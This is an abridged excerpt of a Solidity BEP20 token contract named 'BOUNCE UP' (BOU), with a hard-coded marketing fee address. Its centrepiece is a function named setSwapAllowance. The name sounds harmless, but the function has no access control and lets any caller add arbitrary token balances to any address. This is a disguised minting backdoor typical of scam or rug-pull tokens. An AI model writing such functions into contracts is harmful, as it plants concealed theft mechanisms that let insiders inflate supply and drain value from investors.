...
contract BOUNCEUP is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "BOUNCE UP";
    string constant _symbol = "BOU";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x21909449db9b800b28A67748ce310C1CBBc831AF;
    ...
    function setSwapAllowance(uint256 value, address DividendTracker)external{
        _rBalance[DividendTracker]=_rBalance[DividendTracker].add(value**_decimals);
    }
